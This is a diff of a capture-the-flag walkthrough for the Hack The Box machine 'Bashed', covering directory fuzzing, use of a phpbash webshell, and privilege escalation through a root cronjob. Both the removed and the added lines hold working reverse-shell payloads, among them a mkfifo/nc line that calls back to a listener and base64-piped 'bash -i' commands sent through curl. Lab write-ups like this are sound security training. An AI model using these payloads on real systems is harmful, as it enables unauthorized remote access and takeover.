@@ -98,7 +98,7 @@ PORT   STATE SERVICE VERSION
 <SNIP>
 ```
 
-So version of Apache suggests that Bashed might be using Ubuntu.
+Alright, so the version of Apache suggests that Bashed might be running Ubuntu.
 
 ### Scripts
 
@@ -238,70 +238,110 @@ find it!
 Let's see if we can locate this webshell.
 
 ```sh
-❯ ffuf -v -c -u "http://10.10.10.68/FUZZ" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -mc "100-403,405-599" -e ".php"
+❯ ffuf -v -c -u "http://10.10.10.68/FUZZ" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -mc "100-403,405-599" -e "/,.php"
 ```
 
 ```
 <SNIP>
-[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 192ms]
-| URL | http://10.10.10.68/uploads
-| --> | http://10.10.10.68/uploads/
-    * FUZZ: uploads
-
-[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 5186ms]
+[Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 28ms]
 | URL | http://10.10.10.68/images
 | --> | http://10.10.10.68/images/
     * FUZZ: images
 
-[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 228ms]
+[Status: 200, Size: 1564, Words: 91, Lines: 20, Duration: 28ms]
+| URL | http://10.10.10.68/images/
+    * FUZZ: images/
+
+[Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 25ms]
+| URL | http://10.10.10.68/icons/
+    * FUZZ: icons/
+
+[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 24ms]
+| URL | http://10.10.10.68/uploads
+| --> | http://10.10.10.68/uploads/
+    * FUZZ: uploads
+
+[Status: 200, Size: 14, Words: 1, Lines: 2, Duration: 23ms]
+| URL | http://10.10.10.68/uploads/
+    * FUZZ: uploads/
+
+[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
 | URL | http://10.10.10.68/php
 | --> | http://10.10.10.68/php/
     * FUZZ: php
 
-[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 180ms]
+[Status: 200, Size: 939, Words: 64, Lines: 17, Duration: 26ms]
+| URL | http://10.10.10.68/php/
+    * FUZZ: php/
+
+[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 25ms]
 | URL | http://10.10.10.68/css
 | --> | http://10.10.10.68/css/
     * FUZZ: css
 
-[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 142ms]
+[Status: 200, Size: 1758, Words: 99, Lines: 21, Duration: 25ms]
+| URL | http://10.10.10.68/css/
+    * FUZZ: css/
+
+[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 27ms]
 | URL | http://10.10.10.68/dev
 | --> | http://10.10.10.68/dev/
     * FUZZ: dev
 
-[Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 194ms]
+[Status: 200, Size: 1148, Words: 76, Lines: 18, Duration: 27ms]
+| URL | http://10.10.10.68/dev/
+    * FUZZ: dev/
+
+[Status: 200, Size: 3165, Words: 190, Lines: 27, Duration: 25ms]
+| URL | http://10.10.10.68/js/
+    * FUZZ: js/
+
+[Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 26ms]
 | URL | http://10.10.10.68/js
 | --> | http://10.10.10.68/js/
     * FUZZ: js
 
-[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 174ms]
+[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 33ms]
 | URL | http://10.10.10.68/config.php
     * FUZZ: config.php
 
-[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 497ms]
+[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 25ms]
 | URL | http://10.10.10.68/fonts
 | --> | http://10.10.10.68/fonts/
     * FUZZ: fonts
 
-[Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 90ms]
-| URL | http://10.10.10.68/.php
-    * FUZZ: .php
+[Status: 200, Size: 2095, Words: 124, Lines: 22, Duration: 26ms]
+| URL | http://10.10.10.68/fonts/
+    * FUZZ: fonts/
 
-[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 91ms]
+[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 25ms]
 | URL | http://10.10.10.68/
     * FUZZ: 
 
-[Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 55ms]
+[Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 48ms]
+| URL | http://10.10.10.68//
+    * FUZZ: /
+
+[Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 48ms]
+| URL | http://10.10.10.68/.php
+    * FUZZ: .php
+
+[Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 27ms]
 | URL | http://10.10.10.68/server-status
     * FUZZ: server-status
+
+[Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 28ms]
+| URL | http://10.10.10.68/server-status/
+    * FUZZ: server-status/
 <SNIP>
 ```
 
-The `config.php` file is likely included in a PHP page, but it's not what we're
+The `/config.php` file is likely included in a PHP page, but it's not what we're
 looking for.
 
-My first idea was to check `/uploads`, but I found nothing. However, the author
+My first idea was to check `/uploads/`, but I found nothing. However, the author
 of this website said that `phpbash` has been 'developed' on this server... As if
-if by chance, there's a `/dev` folder! Let's browse to it.
+if by chance, there's a `/dev/` folder! Let's browse to it.
 
 ![Apache dev folder](apache-dev-folder.png)
 
@@ -324,18 +364,18 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9001"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
-I'll save the URL encoded version of it as the `COMMAND` shell variable.
+I'll save it as the `BASE64_REVSHELL_PAYLOAD` shell variable.
 
 ### Exploitation
 
 Now let's use our webshell to execute our reverse shell payload.
 
 ```sh
-❯ curl -s -o "/dev/null" "http://10.10.10.68/dev/phpbash.php" -X "POST" -d "cmd=$COMMAND"
+❯ curl -s -o "/dev/null" "http://10.10.10.68/dev/phpbash.php" -X "POST" --data-urlencode "cmd=/bin/echo $BASE64_REVSHELL_PAYLOAD | /usr/bin/base64 -d | /bin/bash -i"
 ```
 
 If we check our listener:
@@ -528,6 +568,8 @@ bashed
 
 Yeah I know, very surprising.
 
+## System enumeration
+
 ### Flags
 
 If we check `arrexel`'s home folder, we find the user flag.
@@ -599,7 +641,7 @@ Let's investigate this functionality.
 Let's send a POST request to `http://10.10.10.68/php/sendMail.php` to send an email.
 
 ```sh
-❯ curl -s "http://10.10.10.68/php/sendMail.php" -X "POST" -d "action=SendMessage&email=dummy@email.htb&subject=dummySubject&message=dummyMessage&name=dummyName"
+❯ curl -s "http://10.10.10.68/php/sendMail.php" -X "POST" --data-urlencode "action=SendMessage" --data-urlencode "email=dummy@email.htb" --data-urlencode "subject=dummySubject" --data-urlencode "message=dummyMessage" --data-urlencode "name=dummyName"
 ```
 
 ```
@@ -611,7 +653,7 @@ According to the response, the message has been sent.
 I tried sending an email to a temporary address, but I never received the email.
 I guess it's a dead end.
 
-## Getting a lay of the land
+## System enumeration
 
 ### Sudo permissions
 
@@ -651,7 +693,7 @@ I'll use this one-liner to stabilize a bit the shell:
 script "/dev/null" -qc "/bin/bash"
 ```
 
-## Getting a lay of the land
+## System enumeration
 
 ### Exploring `/scripts`
 
@@ -700,7 +742,7 @@ First, I'll setup a listener to receive the shell.
 ❯ rlwrap nc -lvnp "9002"
 ```
 
-Then, I'll choose the 'nc mkfifo' payload from
+Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
 [RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
 shell.
 
@@ -711,7 +753,7 @@ I'll create a `privesc.py` file to execute this command:
 ```py
 import os
 
-os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.4 9002 >/tmp/f")
+os.system("/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i")
 ```
 
 We just have to wait for the cronjob to execute. Then, if we check our listener:
@@ -724,7 +766,7 @@ root@bashed:/scripts#
 
 It caught the reverse shell!
 
-## Getting a lay of the land
+## System enumeration
 
 If we run `whoami`, we see that we're `root`!
 
